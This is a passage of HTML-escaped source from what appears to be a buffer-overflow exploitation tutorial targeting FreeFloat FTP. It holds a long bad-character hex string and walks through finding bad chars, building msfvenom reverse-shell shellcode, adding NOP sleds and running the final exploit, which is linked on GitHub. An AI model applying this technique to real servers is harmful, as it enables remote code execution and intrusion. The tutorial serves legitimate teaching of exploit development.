+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5f&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;72&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;85&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;93&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;98&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;aa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ab&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ae&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;af&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ca&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ce&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d1&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;da&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;df&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e4&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ea&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;eb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ee&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Since &lt;strong&gt;\x00&lt;/strong&gt; is a common bad char, we will remove it in advance and add the rest of the hex values into our payload.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Close the debugger, restart the application, reattach and resume the application. Run our modified exploit code. Right click on the &lt;strong&gt;ESP&lt;/strong&gt; and go to follow dump and we will get something like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see all of the hex values in the dump. However, after &lt;strong&gt;\x09&lt;/strong&gt; , &lt;strong&gt;\x0a&lt;/strong&gt; is nowhere to be found. This indicates that &lt;strong&gt;\x0a&lt;/strong&gt; is a possible bad character. We then add it into a list of bad chars.&lt;/p&gt;
+
+&lt;p&gt;Update our exploit code and repeat the step to find bad chars until no more bad chars left.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/24.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/25.png&quot; alt=&quot;25&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We found out that the bad chars for our shellcode for this application is : &lt;strong&gt;\x00&lt;/strong&gt; , &lt;strong&gt;\x0a&lt;/strong&gt; , &lt;strong&gt;\x0d&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;(p/s: we don’t need to change the value of our &lt;strong&gt;EIP&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/26.png&quot; alt=&quot;26&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/27.png&quot; alt=&quot;27&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;5-crafting-shellcode&quot;&gt;5. Crafting shellcode&lt;/h2&gt;
+
+&lt;p&gt;In this case, we will be using &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; for our shellcode. Using below command, we can create a reverse shell shellcode which will not contains our bad chars.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/28.png&quot; alt=&quot;28&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Add our shellcode into our payload&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/29.png&quot; alt=&quot;29&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;6-add-few-nopsleds-before-the-shellcode&quot;&gt;6. Add few NOPsleds before the shellcode&lt;/h2&gt;
+
+&lt;p&gt;Okay, we have overwritten &lt;strong&gt;EIP&lt;/strong&gt;, add some padding so we can reach our &lt;strong&gt;ESP&lt;/strong&gt; buffer and then we place our shellcode. Then that’s all…, right?&lt;/p&gt;
+
+&lt;p&gt;But why we need to add &lt;strong&gt;NOPsleds&lt;/strong&gt; before our shellcode? What are &lt;strong&gt;NOPsleds&lt;/strong&gt; and what impact it can give to the effectiveness of our exploit?&lt;/p&gt;
+
+&lt;p&gt;Basically, a &lt;strong&gt;NOP&lt;/strong&gt; is a no operation opcode, which means, it does nothing and move on to the next instruction (opcodes). &lt;strong&gt;NOPsleds&lt;/strong&gt; or &lt;strong&gt;NOP slides&lt;/strong&gt; is a series of NOPs which does nothing. However, these &lt;strong&gt;NOPsleds&lt;/strong&gt; are crucial in the effectiveness of the execution of our shellcode.&lt;/p&gt;
+
+&lt;p&gt;Let’s compare both flows of buffer overflow exploit and the output when I tested both of them;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Buffer | EIP | padding before ESP | shellcode&lt;/code&gt; &lt;strong&gt;–&amp;gt; Exploit failed&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;VS&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Buffer | EIP | padding before ESP | nopsleds | shellcode&lt;/code&gt; &lt;strong&gt;–&amp;gt; Exploit succeeded&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The best explanation I can give is ;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;NOPsleds&lt;/strong&gt; can increase the accuracy of the target address. So, if the program lands in the &lt;strong&gt;NOPsleds&lt;/strong&gt; after the controlled &lt;strong&gt;EIP&lt;/strong&gt;, it will continue doing nothing until it reaches the shellcode thus can reduce the risk of the shellcode to be overwritten / corrupted by the program instructions.&lt;/p&gt;
+
+&lt;p&gt;Now, open up our listener and then run our finished exploit code. (Get it on &lt;a href=&quot;https://raw.githubusercontent.com/yunaranyancat/62-69-6e-61-72-79-20-65-78-70-6c-6f-69-74-61-74-69-6f-6e/master/FreeFloat%20FTP/dir.py&quot;&gt;github&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/finalexploit.gif&quot; alt=&quot;end&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;conclusion-&quot;&gt;Conclusion :&lt;/h3&gt;
+
